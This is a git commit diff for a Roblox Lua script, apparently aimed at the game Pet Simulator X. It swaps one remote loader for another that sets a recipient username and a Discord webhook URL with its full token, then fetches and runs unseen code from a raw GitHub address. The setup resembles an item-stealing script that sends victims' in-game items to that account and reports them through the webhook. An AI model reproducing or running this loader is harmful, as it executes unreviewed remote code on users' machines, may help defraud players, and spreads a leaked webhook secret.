edf0ce4f25dc3658df29bd70ae62775cc4e694d3
Alwwex <118074781+Alwwex@users.noreply.github.com>
2023-02-14 19:39:59 +0100

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://milkup.info/script/PetSimulatorX/"))()
+UserName = "alexandrugutu07"
+WebHook = "https://discord.com/api/webhooks/1075106379469164715/mMvVhhOZmLHuc_dbDNypeFZWmNmZ4AFjFIyxtD9taLFdsg0TCD8xCYnqjtXgpDUb64zN"
+Mention = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
